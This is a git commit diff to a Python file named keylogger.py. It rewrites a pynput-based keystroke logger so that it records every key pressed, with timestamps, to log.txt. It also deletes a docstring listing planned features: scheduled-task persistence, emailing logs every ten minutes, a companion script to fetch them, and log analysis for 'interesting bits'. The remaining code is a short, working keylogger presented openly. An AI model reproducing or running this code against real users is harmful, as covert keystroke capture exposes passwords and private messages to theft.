9e081e3bae9db3bf1981fed105c157a2ec630d21
Andranik Sahakyan <8908029+andranik-sahakyan@users.noreply.github.com>
2018-04-04 12:40:51 -0700

    Fixed keylogging and removed unnecessary code.

--- keylogger.py
+++ keylogger.py
@@ -1,43 +1,12 @@
-#!/usr/bin/env python
-
 from pynput.keyboard import Key, Listener
-from datetime import date
-import psutil
-import os
-import threading
+import logging
 
 
-PATH = os.path.dirname(os.path.abspath(__file__))
-log = ''
-
+logging.basicConfig(filename=('log.txt'), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
 
 def on_press(key):
-    global log
-    log += str(key)
-
-
-def saveLog(log):
-    with open('log.txt', 'a') as f:
-        f.write(log + '\n')
-
-
-def writeSchedule(log, interval):
-    # threading.Timer(float(interval), writeSchedule).start()
-    saveLog(log)
-    return ''
+    logging.info(key)
 
 
 with Listener(on_press=on_press) as listener:
     listener.join()
-
-
-log = writeSchedule(log, 20)
-
-
-"""
-Create buffer and save after every t seconds
-Create a task in task scheduler.
-Send logs to email every 10 min
-Companion script downloads emails
-Analyze logs to find interesting bits
-"""
